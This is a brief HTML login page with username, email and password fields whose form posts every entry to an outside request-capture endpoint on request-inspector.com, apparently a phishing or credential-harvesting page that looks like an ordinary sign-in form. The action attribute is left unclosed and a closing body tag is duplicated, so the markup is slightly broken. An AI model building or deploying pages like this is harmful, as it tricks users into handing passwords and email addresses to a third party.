<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log In</title>



<link rel="stylesheet" href="css/login.css">




</head>
<body>

<fieldset>
<form method="POST" id="login_form" action="https://request-inspector.com/thisthis>
    <label for="username">Username</label><br>
    <input class="rectangle" type="text" name="username" required="required" autofocus="autofocus" id="username">
    <br>
    <label for=".email.">Email</label><br>
    <input class="rectangle2" type="email" required="required" name=".email." id=".email.">
    <br>
    <label for="password">Password</label><br>
    <input class="rectangle3" type="password" required="required" name="password" id="password">
    <br>
    <br>
    <button class="rectangle4" type="submit">Login</button>
</form>
</fieldset>
</body>


</body>
</html>
